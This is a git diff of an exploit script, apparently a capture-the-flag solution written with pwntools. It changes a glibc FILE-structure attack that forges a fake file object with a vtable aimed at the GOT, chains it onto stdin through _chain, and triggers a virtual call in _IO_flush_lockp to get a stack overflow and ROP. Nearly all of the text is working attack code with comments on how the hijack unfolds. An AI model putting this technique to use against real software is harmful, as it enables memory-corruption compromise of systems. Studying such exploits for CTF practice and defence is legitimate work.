@@ -26,17 +26,18 @@ buf_end =  0x601f00
 vtable = 0x0000000000600fd8 # point to GOT
 mode = 0xffffffff
 fake_fp = "%13$s%9$s".ljust(0x20,"\x00") + p64(write_base) + p64(write_ptr) + p64(write_end) + p64(0)*10+ p64(lock) + p64(0)*6 + p32(mode) + p32(0) + p64(0)*2 + p64(vtable)
-# %13$s read until no data in buffer
+# %13$s read until stdin buffer is empty
 # %9$s read the rop payload to stack
 # Be triggered in _IO_flush_lockp
 r.sendline(fake_fp)
 
-payload = p64(write_base) + p64(write_ptr) + p64(write_end) + p64(buf_base) + p64(buf_end) + p64(0)*4 + p64(fp) + p64(0)
+#payload = p64(write_base) + p64(write_ptr) + p64(write_end) + p64(buf_base) + p64(buf_end) + p64(0)*4 + p64(fp) + p64(0)
+payload =  p64(0)*9 + p64(fp) + p64(0)
 # Let _chain in stdin point to the fp
 r.sendline(payload)
 
 # Now the linked list of FILE :
-# stderr -> stdout -> stdin -> fp -> fake_fp
+# stderr -> stdout -> stdin -> fake_fp -> g_buf_ptr
 # the virtual function call will be triggered in fake_fp
 # You will get a stack overflow and rop
 
